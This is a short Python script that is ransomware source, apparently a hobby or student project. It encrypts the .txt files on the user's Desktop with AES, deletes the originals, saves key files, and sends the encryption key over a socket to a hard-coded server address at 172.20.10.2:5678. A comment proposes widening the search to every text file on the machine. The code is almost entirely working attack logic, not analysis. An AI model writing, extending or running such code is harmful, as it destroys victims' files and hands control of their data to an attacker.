import socket
import random
import string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import glob
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric.padding import OAEP



def generate_key(length=16):
    characters = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(characters) for i in range(length))
    return key

def find_all_files():
    # Uncomment when ready in order to get all text files on the PC
    # txt_files = glob.glob('**/*.txt', recursive=True)
    desktop_path = os.path.expanduser("~/Desktop")
    file_pattern = os.path.join(desktop_path, "*.txt")
    txt_files = glob.glob(file_pattern)
    return txt_files

def encrypt_file(file_path, key):
    iv = os.urandom(16)
    with open(file_path, 'rb') as f:
        message = f.read()
        padded_message = message + ((16 - len(message) % 16) * chr(16 - len(message) % 16)).encode()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_message = cipher.encrypt(padded_message)
        with open(file_path + '.encrypted', 'wb') as f_out:
            f_out.write(iv + encrypted_message)
    os.remove(file_path)


def find_all_encrypted_files():
    txt_files = glob.glob('**/*.encrypted', recursive=True)
    return txt_files

def save_key(key):
    desktop_path = os.path.expanduser("~/Desktop")
    file_path = os.path.join(desktop_path, 'Key.key')
    with open(file_path, 'wb') as f:
        f.write(key)

def generate_RSA_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return public_key, private_key

def save_RSA_keys(public_key, private_key):
    desktop_path = os.path.expanduser("~/Desktop")
    with open(desktop_path + "/keyPair.key", "wb") as f:
        f.write(public_key)
        f.write(b"\n")
        f.write(private_key)



def encrypt_using_public(public_key, message):
    pk = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(pk)
    ciphertext = cipher.encrypt(message)
    return ciphertext
def decrypt_using_private(private_key, ciphertext):
    pvk = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(pvk)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext


key = generate_key(16)
bytes_key = key.encode('utf-8')



txt_files = find_all_files()

for file_path in txt_files:
    encrypt_file(file_path, bytes_key)

save_key(bytes_key)
public_key, private_key = generate_RSA_keys()
save_RSA_keys(public_key, private_key)

encrypted_files = find_all_encrypted_files()


encrypted_key = encrypt_using_public(public_key=public_key, message=bytes_key)

#plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
#print (plaintext)

#connect to the server and send the encrypted key to it
SERVER_IP = '172.20.10.2'
SERVER_PORT = 5678        
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
     s.connect((SERVER_IP, SERVER_PORT))
     data = s.recv(1024)
     print(data)
     s.send(bytes_key)
input()


